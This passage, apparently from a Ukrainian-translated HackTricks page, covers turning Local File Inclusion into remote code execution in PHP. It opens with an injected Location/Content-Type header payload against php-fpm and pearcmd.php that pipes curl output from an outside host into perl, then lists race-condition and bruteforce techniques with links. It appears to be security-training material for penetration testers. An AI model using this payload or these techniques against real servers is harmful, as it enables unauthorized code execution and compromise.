Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Через phpinfo() (file_uploads = on)

Якщо ви знайшли **Local File Inclusion** і файл, що показує **phpinfo()** з file_uploads = on, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Через compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Якщо ви знайшли **Local File Inclusion** і ви **can exfiltrate the path** тимчасового файлу, АЛЕ **server** **checking**, чи **file to be included has PHP marks**, ви можете спробувати **bypass that check** за допомогою цієї **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Через eternal waiting + bruteforce

Якщо ви можете зловживати LFI, щоб **upload temporary files** і змусити **server** **hang** виконання PHP, тоді ви можете **brute force filenames during hours**, щоб знайти тимчасовий файл:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### До Fatal Error

Якщо ви включите будь-який з файлів `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Вам потрібно включити той самий файл 2 рази, щоб викликати цю помилку).

**I don't know how is this useful but it might be.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
